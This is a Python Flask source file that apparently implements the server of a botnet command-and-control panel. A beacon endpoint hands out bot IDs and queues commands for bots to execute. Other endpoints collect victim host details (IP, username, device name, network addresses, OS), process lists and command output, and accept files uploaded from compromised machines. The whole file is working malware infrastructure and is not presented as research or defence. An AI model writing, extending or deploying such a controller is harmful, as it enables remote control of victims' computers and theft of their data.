import os

from flask import request
import flask
from werkzeug.utils import secure_filename

from sqlweb.app import app
from sqlweb.app import get_db
from sqlweb import dbmain
import time
import datetime
import uuid


@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """
    Beacon heartbeat endpoint
    Used by the bot to check in and get additional commands
    If there are no commands to execute, returns "1" (OK/NOP)
    Uses X-Session-ID cookie as a bot UUID

    :return: command for bot to execute
    """
    if request.method == 'POST':
        conn = get_db()
        checkin = int(time.time())

        if 'X-Session-ID' not in request.cookies:
            print("New checkin at " + str(checkin))
            resp = flask.Response(str(checkin))
            bot_id = uuid.uuid1()
            print("Adding new UUID to db:" + str(bot_id))
            resp.set_cookie("X-Session-ID", str(bot_id), expires=datetime.datetime.now() + datetime.timedelta(days=30))
            dbmain.add_bot_to_db(conn, bot_id, checkin)
            return resp
        else:
            id = request.cookies['X-Session-ID']
            dbmain.add_bot_to_db(conn, id, checkin)
            dbmain.checkin(conn, id)
            dbmain.get_bot_info(conn, id)
            command = dbmain.get_bot_commandqueue(conn, id)[0]
            if command != "":
                print("Command to execute: ", command)
                dbmain.update_commandqueue(conn, id, "")
                return command
        return "1"


@app.route('/info', methods=['POST'])
def info():
    """
    Endpoint for receiving info from bot and updating record in DB
    Order: public IP, username, device-name, region, memory amount, network_addresses (comma delimited)
    :return:
    """
    if request.method == 'POST':
        if 'X-Session-ID' not in request.cookies:
            print('No cookie found - cannot update info')
            print(request.data.decode().split('&'))
        else:
            id = request.cookies['X-Session-ID']
            conn = get_db()
            spltdata = (request.data.decode().split('&'))
            dbmain.update_ip(conn, id, spltdata[0])
            dbmain.update_username(conn, id, spltdata[1])
            dbmain.update_devicename(conn, id, spltdata[2])
            dbmain.update_region(conn, id, spltdata[3])
            dbmain.update_memory(conn, id, spltdata[4])
            dbmain.update_networkaddresses(conn, id, spltdata[5])
            dbmain.update_os(conn, id, spltdata[6])
        return "yeet"

@app.route('/ps', methods=['POST'])
def ps():
    """
    Endpoint for &-delimited process list
    Updates list in DB accordingly
    :return:
    """
    if request.method == 'POST':
        if 'X-Session-ID' not in request.cookies:
            print('No cookie found - cannot update info')
        else:
            print(request.cookies['X-Session-ID'])
            conn = get_db()
            proc_string = request.data.decode()
            dbmain.update_proclist(conn, request.cookies['X-Session-ID'], proc_string)
        return "ps"


@app.route('/upload', methods=['POST'])
def upload():
    """
    Endpoint for file uploads
    Takes file named "file" and writes it to upload directory\sessionid\timestamp_filename
    :return:
    """
    if request.method == 'POST':
        # check if the post request has the file part
        if 'file' not in request.files or 'X-Session-ID' not in request.cookies:
            return 'error'
        file = request.files['file']
        # if user does not select file, browser also submit an empty part without filename
        if file.filename == '':
            print('No selected file')
            return 'error'
        if file:
            filename = secure_filename(str(int(time.time())) + "_" + file.filename)
            cookiename = secure_filename(request.cookies['X-Session-ID'])
            dir = app.config['UPLOAD_FOLDER'] + os.sep + cookiename
            if not os.path.exists(dir):
                os.makedirs(dir)
            file.save(os.path.join(dir, filename))
            return 'success'
    return 'maybe'


@app.route('/out', methods=['POST'])
def out():
    """
    Endpoint for command output
    :return:
    """
    if request.method == 'POST':
        if 'X-Session-ID' not in request.cookies:
            print('No cookie found - cannot update info')
        else:
            print(request.cookies['X-Session-ID'])
            conn = get_db()
            out_string = request.data.decode()
            dbmain.update_commandout(conn, request.cookies['X-Session-ID'], out_string)
        return "out"


@app.route('/echo', methods=['POST'])
def echo():
    if request.method == 'POST':
        if 'X-Session-ID' not in request.cookies:
            print('No cookie found - cannot update info')
            print(request.data.decode().split('&'))
        else:
            id = request.cookies['X-Session-ID']
            print(id)
            spltdata = (request.data.decode().split('&'))
            for d in spltdata:
                print(d)
        return "yeet"
